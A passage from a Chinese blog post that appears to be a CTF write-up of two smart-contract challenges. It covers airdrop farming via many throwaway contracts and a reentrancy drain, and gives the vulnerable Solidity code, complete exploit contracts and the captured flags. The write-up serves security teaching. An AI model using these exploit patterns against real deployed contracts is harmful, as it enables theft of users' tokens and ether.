+<p>Flag：<code>ssec2024{W3Lc0mE_70_e7H_cOn7R4C7_s3CUrITY|668e5bd7}</code></p>
+<h2 id="薅羊毛攻击">薅羊毛攻击</h2>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">✦ Playground deployer</span><span class="punctuation">:</span> <span class="string">0x917F4FF417326837cf71069C8b14D4a8DCF41367</span></span><br><span class="line"> <span class="attribute">✦ Your token</span><span class="punctuation">:</span> <span class="string">v4.local.kgwt21x7aDUl4g7XXFoK6cegDh4TAr5Q5aw4jtDQI25D5Z_nXhGC8KkLrUqI4pZlm1-HZLzsc2u-NIKIdlwNM4N5MzPDL-Ivr-XZYpqu2NvHSbsWr4JJjI-nvRxqor0fbnQWkaURtn26WuXL8gmGI5WR94BdQKQeI7Q5imh8KyTftA</span></span><br><span class="line"> <span class="attribute">✔ Deployer received enough value in transaction</span><span class="punctuation">:</span> <span class="string">0x95a3eee35a85c2fdd2a4f4459be8791d9d30a48f925d2b88e0d80e7b83e13f57</span></span><br><span class="line"> <span class="attribute">✦ target contract address</span><span class="punctuation">:</span> <span class="string">0x95711daBD871cf56aFD1C5Ee393475e3CA579A16</span></span><br><span class="line"> <span class="attribute">✦ Transaction hash</span><span class="punctuation">:</span> <span class="string">0x8938bf5dbf643525c7a860d6b37426796afaf43732bd95a354a0e42038d7472a</span></span><br></pre></td></tr></table></figure>
+<p>代码实现了一个名为 <code>AirDrop</code> 的 ERC20 代币合约，继承自 OpenZeppelin 的 <code>ERC20</code> 合约。该合约定义了一个映射 <code>logger</code>，用于记录用户是否已经获得奖励。在 <code>profit</code> 函数中，用户只能首次调用该函数并获得 20 个代币。在 <code>getFlag</code> 函数中，用户需要至少持有 500 个代币才能触发 <code>SendFlag</code> 事件。该合约的目标是通过代币空投的方式向用户奖励，并且设有条件来触发一个事件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ccb5f2d8ca9d194623cf3cff7f010ab92715826b/contracts/token/ERC20/ERC20.sol";</span><br><span class="line"></span><br><span class="line">contract AirDrop is ERC20 {</span><br><span class="line">    mapping (address=&gt;uint) logger;</span><br><span class="line">    event SendFlag();</span><br><span class="line"></span><br><span class="line">    constructor() ERC20("ZJU SSEC", "ZJU") {}</span><br><span class="line"></span><br><span class="line">    function profit() public {</span><br><span class="line">        require(logger[msg.sender] == 0);</span><br><span class="line">        logger[msg.sender] = 1;</span><br><span class="line">        _mint(msg.sender, 20);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function getFlag() public {</span><br><span class="line">        require(balanceOf(msg.sender) &gt;= 500);</span><br><span class="line">        emit SendFlag();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>查看<code>ERC20</code>的文档，发现里面有一些合约中最基本的函数，比如<code>transfer</code>和<code>balanceof</code>等等</p>
+<p><img src="/2025/06/26/Ssec/image-20241208011229992.png"></p>
+<p>也就是说我们也可以在合约中调用<code>ERC20</code>中的<code>transfer</code>函数。</p>
+<p>本题为薅羊毛攻击，也就是可以通过很多个账户领取空投，然后集中起来给一个账户转账，使得该账户下的代币数量超过500，触发<code>getFlag</code>事件。</p>
+<p>本题的攻击合约代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface target_contract {</span><br><span class="line"></span><br><span class="line">    function profit() external;</span><br><span class="line"></span><br><span class="line">    function getFlag() external;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) external returns (bool);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract transfer_me {</span><br><span class="line">    constructor(address addr, address addr_target) {</span><br><span class="line">        target_contract t = target_contract(addr_target);</span><br><span class="line">        t.profit();</span><br><span class="line">        t.transfer(addr, 20);</span><br><span class="line">} }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Exploit{</span><br><span class="line">    function airdrop(address addr_target, uint64 num) public returns (bool){</span><br><span class="line">        for (uint64 i = 0; i &lt; num; i += 1) </span><br><span class="line">        {</span><br><span class="line">            new transfer_me(address(this), addr_target);</span><br><span class="line">        }</span><br><span class="line">        target_contract(addr_target).getFlag();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>通过创建 <code>Exploit</code> 合约，在 <code>Exploit</code> 合约中，使用<code>airdrop()</code> 函数通过循环多次创建 <code>transfer_me</code> 合约实例，每次创建时都会调用目标合约的 <code>profit()</code> 函数为调用者分配奖励，并通过 <code>transfer()</code> 函数将 20 个代币转账给攻击者合约的地址。</p>
+<p>这样，我们可以多次触发 <code>profit()</code> 和 <code>transfer()</code> 函数，并积累大量代币达到<code>getFlag</code>的需求。</p>
+<p><img src="/2025/06/26/Ssec/image-20241208012227731.png"></p>
+<p>合约地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x95711daBD871cf56aFD1C5Ee393475e3CA579A16</span><br></pre></td></tr></table></figure>
+<p>获取flag截图：</p>
+<p><img src="/2025/06/26/Ssec/image-20241208012348147.png"></p>
+<p>flag：<code>ssec2024{nOw_YoU_KnOw_hoW_7O_A1RDrOP_HuNTIn9|948957e0}</code></p>
+<h2 id="重入攻击">重入攻击</h2>
+<p>本题考点在于重入漏洞。</p>
+<ul>
+<li>攻击原理：
+<ul>
+<li>调用性质：当一个合约调用另一个合约时，被调用的合约可以在调用者完成其操作前执行代码，如果调用者合约的状态还未更新，这就可能被恶意利用。</li>
+<li>状态一致性：由于状态更新（比如，减少调用者余额）可能在外部调用之后进行，攻击者可以通过在外部调用期间发起新的调用（重入），来重复执行某个操作，从而提取超过其原本应得的数量。</li>
+</ul></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract Reentrance {</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    constructor() payable {} // transfer 0.001 ETH when deploy</span><br><span class="line"></span><br><span class="line">    function donate(address _to) public payable {</span><br><span class="line">        balances[_to] = balances[_to] + msg.value;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) {</span><br><span class="line">        return balances[_who];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) public {</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) {</span><br><span class="line">            (bool result,) = msg.sender.call{value: _amount}("");</span><br><span class="line">            if (result) {</span><br><span class="line">                _amount;</span><br><span class="line">            }</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) {</span><br><span class="line">        return (address(this).balance == 0);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    receive() external payable {}</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>本题的解题思路如下：</p>
+<p>首先将一定数量的以太币捐赠给目标合约，并随后调用目标合约的 <code>withdraw</code> 函数尝试提取相同数量的以太币。在 <code>receive</code> 函数中，合约接收到以太币时，会判断发送者的余额，若余额足够，则递归调用 <code>withdraw</code> 函数以重复提取以太币；如果余额不足，但仍有余额，则提取发送者账户中的所有余额。通过这种方式，攻击者可以不断触发目标合约中的 <code>withdraw</code> 函数，导致目标合约中的资金被反复提取，直到目标合约的资金耗尽。</p>
+<blockquote>
+<p>一开始<code>donate</code>的<code>value</code>设置为0.001eth的<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex;" xmlns="http://www.w3.org/2000/svg" width="2.595ex" height="2.773ex" role="img" focusable="false" viewbox="0 -864.9 1147.1 1225.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(396.8,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"/></g><rect width="907.1" height="60" x="120" y="220"/></g></g></g></svg></mjx-container></span>, 即0.0001eth</p>
+<p><img src="/2025/06/26/Ssec/image-20241208115006920.png"></p>
+<p>同时切换<code>gaslimit</code>到<code>custom</code>, 保证每次有足够的<code>gas</code>去执行交易。（<code>100000 Gwei = 0.0001eth</code>）</p>
+</blockquote>
+<p>本题的攻击合约如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">interface target {</span><br><span class="line"></span><br><span class="line">    function withdraw(uint) external ;</span><br><span class="line"></span><br><span class="line">    function donate(address) external payable ;</span><br><span class="line">}</span><br><span class="line">contract Exploit{</span><br><span class="line"></span><br><span class="line">    address private _target_addr;</span><br><span class="line"></span><br><span class="line">    constructor (address target_addr){</span><br><span class="line">        _target_addr = target_addr ;</span><br><span class="line">    } </span><br><span class="line"></span><br><span class="line">    function start() public payable {</span><br><span class="line">        target(_target_addr).donate{value: msg.value}(address(this));</span><br><span class="line">        target(_target_addr).withdraw(msg.value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    receive() external payable {</span><br><span class="line">        if (msg.sender.balance &gt;= msg.value) {</span><br><span class="line">            target(msg.sender).withdraw(msg.value);</span><br><span class="line">            return ;</span><br><span class="line">        } </span><br><span class="line">        if (msg.sender.balance &gt; 0) {</span><br><span class="line">            target(msg.sender).withdraw(msg.sender.balance);</span><br><span class="line">            return ;</span><br><span class="line">        } </span><br><span class="line">        return ;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>调用<code>start</code>开始攻击。</p>
+<p><img src="/2025/06/26/Ssec/image-20241208115208931.png"></p>
+<p>获取flag截图：</p>
+<p><img src="/2025/06/26/Ssec/image-20241208114604538.png"></p>
+<p>flag：<code>ssec2024{R3-EnTR4Ncy_1s_VErY_d4NG3rOUs|ce59a400}</code></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2025/06/22/ebpf-verifier/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">eBPF-verifier模块原理分析与漏洞复现</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 晚栀wingee~
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
